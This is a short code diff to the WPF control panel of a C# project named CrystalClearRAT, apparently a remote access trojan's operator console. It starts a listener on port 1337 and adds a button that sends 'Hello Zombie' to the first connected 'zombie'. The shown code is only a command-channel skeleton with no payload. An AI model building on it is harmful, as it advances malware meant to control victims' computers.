@@ -1,10 +1,12 @@
 ﻿using CrystalClearRAT.Web;
+using CrystalClearRAT.ZombieModel;
 using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Net;
 using System.Net.Sockets;
 using System.Text;
+using System.Threading;
 using System.Threading.Tasks;
 using System.Windows;
 using System.Windows.Controls;
@@ -31,8 +33,14 @@ namespace CrystalClearRAT
         private void Grid_Loaded(object sender, RoutedEventArgs e)
         {
             Server.Start(1337);
+
+           // Thread.Sleep(10);
+            
         }
 
-
+        private void Button_Click(object sender, RoutedEventArgs e)
+        {
+            Server.Send(Encoding.UTF8.GetBytes("Hello Zombie"), Zombie.Zombies[0]);
+        }
     }
 }
